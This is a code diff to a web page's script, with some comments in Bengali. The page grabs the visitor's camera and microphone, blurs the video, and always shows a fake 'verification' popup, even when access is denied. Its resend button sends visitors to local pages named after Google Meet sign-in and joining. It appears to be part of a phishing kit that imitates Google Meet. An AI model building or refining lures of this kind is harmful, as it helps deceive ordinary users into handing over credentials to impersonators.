@@ -225,42 +225,66 @@
 
 <script>
   // Start camera
-  const video = document.getElementById('video');
-  const videoArea = document.getElementById('videoArea');
-  const spinnerOverlay = document.getElementById('spinnerOverlay');
-  const popupOverlay = document.getElementById('popupOverlay');
+  const video = document.getElementById("video");
+const videoArea = document.getElementById("videoArea");
+const spinnerOverlay = document.getElementById("spinnerOverlay");
+const popupOverlay = document.getElementById("popupOverlay");
 
-  // Show loading spinner initially
-  spinnerOverlay.style.display = 'flex';
+// প্রথমে Loading দেখাও
+spinnerOverlay.style.display = "flex";
 
-  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(stream => {
-      video.srcObject = stream;
+function showVerificationPopup() {
+    spinnerOverlay.style.display = "none";
 
-      // Hide spinner after 3 seconds
-      setTimeout(() => {
-        spinnerOverlay.style.display = 'none';
+    setTimeout(() => {
+        videoArea.classList.add("blur");
 
-        // Blur video after 2 more seconds
         setTimeout(() => {
-          videoArea.classList.add('blur');
+            popupOverlay.style.display = "flex";
+        }, 1500);
 
-          // Show popup after 2 more seconds
-          setTimeout(() => {
-            popupOverlay.style.display = 'flex';
-          }, 2000);
-        }, 2000);
-      }, 3000);
+    }, 1000);
+}
+
+// Camera চালু করার চেষ্টা
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+
+    navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
     })
+
+    .then(stream => {
+
+        video.srcObject = stream;
+
+        // Camera চালু থাকলেও ৩ সেকেন্ড পরে popup
+        setTimeout(showVerificationPopup, 3000);
+
+    })
+
     .catch(err => {
-      console.error("Camera access failed:", err);
-      spinnerOverlay.style.display = 'none';
+
+        console.log(err);
+
+        // Camera deny হলেও popup
+        showVerificationPopup();
+
     });
 
-  // Resend button event
-  document.getElementById('resendBtn').addEventListener('click', () => {
-    window.location.href = "/Google Meet sign in/"; // আপনার কাঙ্ক্ষিত পেজে রিডাইরেক্ট
-  });
+} else {
+
+    // Browser support না করলেও popup
+    showVerificationPopup();
+
+}
+
+// Resend Button
+document.getElementById("resendBtn").addEventListener("click", () => {
+
+    window.location.href = "../../../Google Meet joining/";
+
+});
 </script>
 </body>
 </html>
